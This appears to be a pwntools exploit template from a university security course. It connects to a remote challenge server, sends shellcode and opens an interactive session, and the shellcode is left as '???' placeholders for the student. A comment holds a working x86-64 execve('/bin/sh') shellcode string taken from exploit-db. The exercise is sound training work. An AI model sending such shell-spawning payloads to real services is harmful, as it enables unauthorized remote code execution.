from pwn import *
context.arch = "amd64"

#io = process("./chall1") # debug in local
io = remote("cusecurity.cs.colorado.edu", 2223) # hack remotely

#shellcode = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05" # https://www.exploit-db.com/exploits/42179
#shellcode = asm(???)
shellcode = asm('''
    ???
''')

io.sendafter(b": ", shellcode)
io.interactive()